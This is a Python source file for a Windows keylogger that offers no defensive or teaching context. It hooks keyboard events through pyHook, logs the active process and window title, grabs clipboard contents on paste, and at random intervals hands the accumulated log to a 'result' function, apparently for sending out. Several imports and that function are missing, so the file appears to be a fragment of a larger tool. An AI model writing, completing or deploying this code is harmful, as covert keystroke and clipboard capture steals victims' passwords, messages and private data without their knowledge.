import ctypes
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi
current_window = None
string = ""


def get_current_process():
    global string
    hwnd = user32.GetForegroundWindow()
    pid = ctypes.c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    process_id = "%d" % pid.value
    executable = ctypes.create_string_buffer(512)
    h_process = kernel32.OpenProcess(0X400 | 0X10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)
    window_title = ctypes.create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
    string += "PID: %s - %s - %s \n" % (process_id, executable.value, window_title.value)


def KeyStroke(event):
    global string
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii))
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            string += "[PASTE] - %s " % pasted_value

        else:
            string += "[%s]" % event.Key
    return True


def main2():
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == '__main__':
    th = threading.Thread(target=main2)
    th.start()
    time.sleep(random.randint(100, 300))
    while True:
        try:
            result(string, "Pkeylogger")
            string = ""
            time.sleep(random.randint(100, 300))
        except:
            continue
